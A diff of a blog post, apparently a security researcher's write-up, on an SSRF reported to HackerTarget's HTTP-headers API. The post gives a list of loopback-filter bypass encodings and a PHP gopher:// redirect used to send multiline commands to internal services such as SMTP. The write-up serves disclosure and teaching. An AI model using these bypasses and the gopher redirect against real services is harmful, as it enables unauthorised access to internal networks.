@@ -3,7 +3,7 @@ layout: post
 title: "Hacking the Hackers: Leveraging an SSRF in HackerTarget"
 ---
 ### &#128187;&nbsp;Introduction:
-This is a write-up of an SSRF I accidentally found in HackerTarget and leveraged to get access to internal services! Please **note** that they **don't** have an active bug bounty program.<br> 
+This is a write-up of an SSRF I accidentally found in HackerTarget and leveraged to get access to internal services! Please **note** that they **don't** have an active bug bounty program.<br>
 <h4>&#129300; What is HackerTarget?</h4>
 <a href="https://hackertarget.com" style="color:#E11D1D">HackerTarget</a> is a service that provides access to online vulnerability scanners and tools used by many security professionals and "makes securing your systems easier". They also are the creators of <a href="https://dnsdumpster.com/" style="color:#E11D1D">DNSDumpster</a>, which is utilized in several recon tools.
 <br><br>
@@ -16,12 +16,12 @@ I was using DNSDumpster for recon during a bug hunting session, and I noticed th
 <br>
 ![HT-HTTPHeaders](/images/ht-httpheaders.png "HTTP Headers function")
 <br><br>
-It made a call to `https://api.hackertarget.com/httpheaders/?q=<target>` and displayed the HTTP Headers of a simple **GET** request sent to the target server. 
+It made a call to `https://api.hackertarget.com/httpheaders/?q=<target>` and displayed the HTTP Headers of a simple **GET** request sent to the target server.
 <br><br>
 ![HT-API-Call](/images/api-result.png "HackerTarget")
 <br><br>I was obviously intrigued, so I tried querying 127.0.0.1! The API dumped the HTTP request and the query went through! I then tried to see if I could get the SSH version by querying **127.0.0.1:22**
 <br><br>Response:<br><br>
-![HT-SSH](/images/ht-ssh.png "HackerTarget") 
+![HT-SSH](/images/ht-ssh.png "HackerTarget")
 <br><br>
 I initially reported it as is, knowing I could hit internal services if there were any. They thanked me for the heads up and told me to check the patch they issued. I checked it, and it was easy to bypass: it was merely blocking 127.0.0.1. Here are a few of the bypasses I used:
 ```
@@ -34,7 +34,7 @@ I initially reported it as is, knowing I could hit internal services if there we
 127.10.1
 127.1.01
 0177.1
-0177.0001.0001 
+0177.0001.0001
 0x0.0x0.0x0.0x0
 0000.0000.0000.0000
 0x7f.0x0.0x0.0x1
@@ -42,15 +42,15 @@ I initially reported it as is, knowing I could hit internal services if there we
 0177.0001.0000..0001
 0x7f.0x1.0x0.0x1
 0x7f.0x1.0x1
-localtest.me 
-``` 
-I informed them that there **isn't** a way to validate the query just by using string-based checks, so I suggested that they **resolve** the domains and **check** them against local IP ranges. They agreed and said they would think about it. 
+localtest.me
+```
+I informed them that there **isn't** a way to validate the query just by using string-based checks, so I suggested that they **resolve** the domains and **check** them against local IP ranges. They agreed and said they would think about it.
 <br><br>
-About 10 days later I asked if they had issued another patch or not, and the response was: 
+About 10 days later I asked if they had issued another patch or not, and the response was:
 > "It is on my todo list. Not critical though as there are no local services that could be hit with it."
 
 <center>
-<h4>&#128527;&nbsp;challenge accepted.</h4> 
+<h4>&#128527;&nbsp;challenge accepted.</h4>
 </center>
 <br>
 
@@ -74,15 +74,15 @@ HackerTarget limits 25 API queries per IP, so my script only showed the ports 1 
  - It is a <a href="https://en.wikipedia.org/wiki/Internet_protocol_suite" rel="noopener noreferrer" target="_blank"><font id="highlighter">TCP/IP</font></a> protocol that's used for sending emails. (who would've guessed? &#128514;)
  - Usually it's used along with either <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Post_Office_Protocol"><font id="highlighter">pop3</font></a> or<a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Internet_Message_Access_Protocol"> <font id="highlighter">imap</font></a>, which are used to receive emails.
 
- 
-I knew I would be able to hit the service with this SSRF, but I wasn't positive that I would be able to send the valid commands needed to send emails from it. I then tried deducting which wrappers were supported and enabled besides **http://** and **https://**. <br><br> 
+
+I knew I would be able to hit the service with this SSRF, but I wasn't positive that I would be able to send the valid commands needed to send emails from it. I then tried deducting which wrappers were supported and enabled besides **http://** and **https://**. <br><br>
 I tried using <font id="highlighter2">dict://</font> right away and was able to get the libcurl version, but that wasn't very helpful. Next, I created a PHP file on my server to initiate a redirect to another port with the <font id="highlighter2">gopher://</font> wrapper:<br>
 ```php
-<?php 
-header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!"); 
+<?php
+header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
 ?>
 ```
-<br> 
+<br>
 In a nutshell, the gopher:// protocol sends 1 character, a new line (CR+LF), and the remaining data, which allows us to send a **multiline request**. <br><br>
 I started netcat and checked the API again: `https://api.hackertarget.com/httpheaders/?q=http://sxcurity.pro/redirect.php`. It followed the redirect  and I received a multiline request on port 1337!
 <br><br>This means I could send valid commands to the internal SMTP server!
@@ -127,9 +127,8 @@ It was a blast to leverage an SSRF on a target that everyone knows of and uses o
 They **DO NOT** have a bug bounty program, so please **DO NOT** test them without their permission!
 <br><br>
 Thanks for reading,<br><br>
-**Corben Douglas** (<font color="#E22A3C">@sxcurity</font>)
+**Corben Leo** (<font color="#E22A3C">@sxcurity</font>)
 - https://hackerone.com/cdl
 - https://twitter.com/sxcurity
 - https://bugcrowd.com/c
 - https://github.com/sxcurity
-
